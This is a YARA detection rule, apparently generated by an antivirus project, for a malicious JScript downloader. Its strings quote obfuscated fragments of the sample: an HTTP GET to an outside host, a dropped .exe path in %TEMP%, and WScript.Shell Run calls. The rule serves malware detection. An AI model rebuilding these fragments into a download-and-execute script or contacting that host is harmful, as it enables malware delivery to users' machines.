rule sig_20160328_12fa284845d8c8a12899485613660889 {
  meta:
    description = "datamaliciousorder - file 20160328_12fa284845d8c8a12899485613660889.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5acd92db6d1a69664b415111dc39d2702c83aebbf787a30b27cbc937cf0a6feb"

  strings:
    $s1  = "function Unlhg() {return Bbmkw[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"yfAIJp8TfZVwJh.exe\";};" fullword ascii
    $s2  = "Zezwpus[Gjsollsvm](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Dosyxj](Dnffo() * 11)} while (Zezwpus[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Bbmkw = function Ykujxf() {return WScript[Cocfeywbl](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Guobmdze(Slhbk, Ashbtkgv){return Slhbk - Ashbtkgv;};" fullword ascii
    $s6  = "function Tbzjdrsd() {return ((Yemmmc == true) && (Yemmmc == Dwmzxu)) ? 1 : Lkkjhnln;};" fullword ascii
    $s7  = "function Yxbgpmwkuo(Rdlmat){Bbmkw[\"Run\"](Rdlmat, Lkkjhnln, Lkkjhnln);};" fullword ascii
    $s8  = "function Wzljeezyar(){return Cocfeywbl;};" fullword ascii
    $s9  = "function Flybvcs()" fullword ascii
    $s10 = "var Lxfzsucpi = new this[\"Date\"]();" fullword ascii
    $s11 = "function Dxdwmn(Pyszpntbk) {var Amonarrj = (1, 2, 3, 4, 5, Pyszpntbk); return Amonarrj;};" fullword ascii
    $s12 = "Dwmzxu = true; " fullword ascii
    $s13 = "Yemmmc = true; " fullword ascii
    $s14 = "function Fjrsdvt(){return Nqihl;};" fullword ascii
    $s15 = " while (Pzytywlpvv){" fullword ascii
    $s16 = "function Dnffo(){return 22;};" fullword ascii
    $s17 = "var Dwmzxu = false;" fullword ascii
    $s18 = "var Yemmmc = false;" fullword ascii
    $s19 = "return Guobmdze(Pvzuzxu, Larjya);" fullword ascii
    $s20 = "var Xvpkkvnvm = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}